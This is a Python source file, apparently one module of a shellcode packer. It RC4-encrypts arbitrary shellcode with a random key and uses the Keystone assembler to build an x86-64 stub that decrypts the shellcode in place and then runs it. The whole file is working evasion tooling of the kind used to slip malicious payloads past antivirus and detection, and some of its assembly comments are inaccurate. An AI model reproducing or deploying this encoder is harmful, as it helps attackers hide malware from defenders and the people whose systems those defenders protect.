from keystone import *
import random
from Crypto.Cipher import ARC4
import os

class RC4:

    def __init__(self, arguments: dict) -> None:
        pass

    def apply(self, shellcode: bytes) -> bytes:
        ks = Ks(KS_ARCH_X86, KS_MODE_64)
        ks.syntax = KS_OPT_SYNTAX_INTEL
        key = os.urandom(16)
        encrypted = ARC4.new(key).encrypt(shellcode)
        decoder_asm = (
            "lea rdi, [rip + skibidi];"     # mov S to rax
            "mov rdx, 0x100;"               # set rdx to 256
            "xor rcx, rcx;"                 # clear rcx"
            "fill_s:"
            "cmp rcx, rdx;"                 # check if rcx == 256
            "jae fill_s_done;"              # if true, jump"
            "mov byte ptr [rdi + rcx], cl;" # move 
            "inc rcx;"                      # increment rcx
            "jmp fill_s;"                   # loop
            "fill_s_done:"
            "xor rax, rax;"                 # clear rax
            "xor rcx, rcx;"                 # clear rcx
            "mov rdx, 0x100;"               # set rdx to 256
            "xor r8, r8;"                   # r8 = j = 0
            "lea r9, [rip + skibidi];"      # r9 = S 
            "lea r10, [rip + key];"         #set r10 to key
            "ksa_start:" 
            "cmp rcx, rdx;"                 # check if rcx == 256
            "jae ksa_done;"                 # jump if done
            "mov rax, r8;"                  # rax = j
            "movzx rbx, byte ptr [r9 + rcx];" # rbx = S[i]
            "add rax, rbx;                  " # rax = rax + S[i]
            "mov rbx, rcx;"                 # rbx = i
            f"and rbx, {hex(len(key)-1)};" # rbx = i % (keylen - 1)
            "movzx rbx, byte ptr [r10 + rbx];" # rbx = key[i % 15]
            "add rax, rbx;"                 # rax = rax + key[i%15]
            "and rax, 0xff;"                # rax = rax % 256
            "mov r8, rax;"                  # r8 = rax
            "movzx rsi, byte ptr [r9 + rcx];" # rsi = S[i]
            "movzx rdi, byte ptr [r9 + rax];" # rdi = S[j]
            "mov byte ptr [r9 + rcx], dil;" # S[i] = S[j]
            "mov byte ptr [r9 + rax], sil;" # S[j] = S[i]
            "inc rcx;"                      # rcx++
            "jmp ksa_start;"
            "ksa_done:"
            "xor rcx, rcx;"                 # rcx = n = 0
            "xor rsi, rsi;"                 # rsi = j = 0
            "xor rdi, rdi;"                 # rdi = i = 0
            f"mov rdx, {hex(len(encrypted))};" # rdx = shellcodelength
            "lea r8, [rip + skibidi];"      # r8 = S
            "lea r10, [rip + encrypted];"   # r8 = S
            "decrypt_start:"
            "cmp rcx, rdx;"                 # if n = shellcodelength
            "jae decrypt_done;"             # done
            "inc rdi;"                      # i += 1
            "and rdi, 0xff;"                # i = i % 256
            "movzx rax, byte ptr [r8 + rdi];" # rax = S[i]
            "add rsi, rax;"                 # j = j + S[i]
            "and rsi, 0xff;"                # j = j % 256
            "movzx rbx, byte ptr [r8 + rdi];" # rbx = S[i]
            "movzx r9, byte ptr [r8 + rsi];"  # r9 = S[j]
            "mov byte ptr [r8 + rdi], r9b;"  # S[i] = S[j]
            "mov byte ptr [r8 + rsi], bl;" # S[j] = S[i]
            "mov rax, rbx;"                 # rax = S[i]
            "add rax, r9;"                  # rax = S[i] + S[j]
            "and rax, 0xff;"                # rax % 256
            "movzx rax, byte ptr [r8 + rax];" # rax = S[S[i] + S[j]]
            "movzx rbx, byte ptr [r10 + rcx];"# rbx = encrypted[n]
            "xor rax, rbx;"                 # rax = encrypted[n] ^ S[S[i] + S[j]]
            "mov byte ptr [r10 + rcx], al;"# plaintext[n] = rax
            "inc rcx;"                      # n += 1
            "jmp decrypt_start;"
            "decrypt_done:"
            "encrypted:"
            f".byte {','.join(f'0x{b:02X}' for b in encrypted)};"
            "skibidi:"
            f".byte {','.join(f'0x00' for b in range(256))};"
            "key:"
            f".byte {','.join(f'0x{b:02X}' for b in key)};"
        )
        encoding, count = ks.asm(decoder_asm)
        return bytes(encoding)
